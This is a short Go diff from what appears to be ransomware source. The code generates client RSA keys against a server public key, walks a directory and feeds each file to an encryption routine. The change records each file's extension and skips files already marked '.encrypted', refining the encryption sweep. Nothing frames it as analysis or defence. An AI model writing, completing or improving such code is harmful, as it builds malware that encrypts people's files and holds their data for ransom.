@@ -58,6 +58,8 @@ func generateClientKeys(servPubKey *rsa.PublicKey) (*rsa.PublicKey, error) {
 
 func encryptFiles(dirPath string, cPubKey *rsa.PublicKey) {
 
+	var ext string
+
 	waitGroup.Add(1)
 	go func() {
 		filepath.WalkDir(dirPath, func(path string, d fs.DirEntry, err error) error {
@@ -74,8 +76,10 @@ func encryptFiles(dirPath string, cPubKey *rsa.PublicKey) {
 				if err != nil {
 					return err
 				}
-
-				filesToVisit <- io.File{Info: info, Path: path, Extension: ""}
+				ext = filepath.Ext(path)
+				if ext != ".encrypted" {
+					filesToVisit <- io.File{Info: info, Path: path, Extension: ext}
+				}
 			}
 			return nil
 		})
